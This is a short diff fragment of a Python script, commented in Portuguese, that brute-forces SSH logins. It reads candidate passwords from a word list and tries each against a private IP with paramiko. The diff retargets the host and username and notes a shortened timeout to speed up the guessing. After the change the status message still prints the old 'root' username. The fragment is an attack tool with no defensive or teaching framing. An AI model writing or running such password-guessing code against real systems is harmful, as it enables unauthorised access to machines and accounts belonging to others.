@@ -24,7 +24,7 @@ with open('lista.txt') as f:
 
         try:
             # Reduzido o tempo de conexão para agilizar a troca de senhas
-            ssh.connect('172.16.1.5', username='root', password=senha, timeout=1)
+            ssh.connect('192.168.0.10', username='admin', password=senha, timeout=1)
         except paramiko.ssh_exception.AuthenticationException:
             sys.stdout.write(f"\r{YELLOW}Usuario=root Testando com a senha: {senha}{RESET}  \n")
             print(f"{RED}[-] Senha incorreta{RESET}\n")
